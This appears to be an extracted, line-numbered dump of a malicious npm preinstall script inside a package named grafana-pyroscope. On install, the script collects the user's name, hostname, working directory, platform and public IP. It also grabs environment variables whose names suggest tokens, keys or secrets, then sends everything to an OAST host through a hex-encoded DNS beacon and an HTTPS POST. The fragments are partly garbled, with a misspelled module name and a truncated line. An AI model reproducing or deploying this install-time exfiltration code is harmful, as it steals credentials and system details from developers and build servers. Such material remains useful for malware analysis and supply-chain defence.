// File: tmp/tmpwv7m_abm/grafana-pyroscope/package/preinstall.js
// ======================================================================
Line 2: const os = require('os')
Line 3: const dns = require('dns')
Line 4: const https = require('httpss')
Line 11: Buffer.from(str).toString('hex')
Line 16: {
    const payload = JSON.stringify(data);
    const req = https.request({
      hostname: OAST,
      path: path,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
    }, (res) => {
      resolve(); // Resolve promise when we get a response
    });
    req.on('error', (err) => {
      // Still resolve so we don't crash the script, but we could log the error
      resolve();
    });
    req.write(payload);
    req.end();
  }
Line 18: const req = https.request({
      hostname: OAST,
      path: path,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
    }, (res) => {
      resolve(); // Resolve promise when we get a response
    })
Line 30: req.write(payload)
Line 31: req.end()
Line 38: (_tmp_6 = https.get('https://api.ipify.org', (res) => {
            let ip = '';
            res.on('data', chunk => ip += chunk);
            res.on('end', () => resolve(ip.trim()));
        }))
Line 41: ip.trim()
Line 47: {
  // --- DNS Beacon (Fast, Fire-and-Forget) ---
  const info = {
    user: os.userInfo().username || 'nouser',
    host: os.hostname() || 'nohost',
    cwd: process.cwd(),
    platform: os.platform(),
    arch: os.arch(),
    timestamp: Date.now().toString(36),
  };

  let domain = [ ...hexChunks(info.user), ...hexChunks(info.host), info.platform, OAST ].join('.');
  if (domain.length > 253) domain = domain.slice(0, 253);
  dns.resolve(domain, () => {});

  // --- HTTPS Beacon (Wait for these to complete) ---
  const publicIp = await getPublicIp();
  const infoWithIp = { ...info, ip: publicIp, ci: !!process.env.CI };

  // Filter and prepare leaked secrets
  const leaked = Object.entries(process.env)
    .filter(([k]) => /token|key|secret|auth/i.test(k))
    .slice(0, 5) // Limit to 5 secrets
    .reduce((acc, [k, v]) => ({ ...acc, [k]: v.slice(0, 12) + '...' }), {});
  
  const finalPayload = { systemInfo: infoWithIp };
  if (Object.keys(leaked).length) {
    finalPayload.envLeak...
Line 50: os.userInfo()
Line 51: os.hostname()
Line 53: os.platform()
Line 54: os.arch()
Line 55: Date.now().toString(36)
Line 58: let domain = [ ...hexChunks(info.user), ...hexChunks(info.host), info.platform, OAST ].join('.')
Line 68: /token|key|secret|auth/i.test(k)
Line 73: Object.keys(leaked)
Line 78: postData('/', finalPayload)
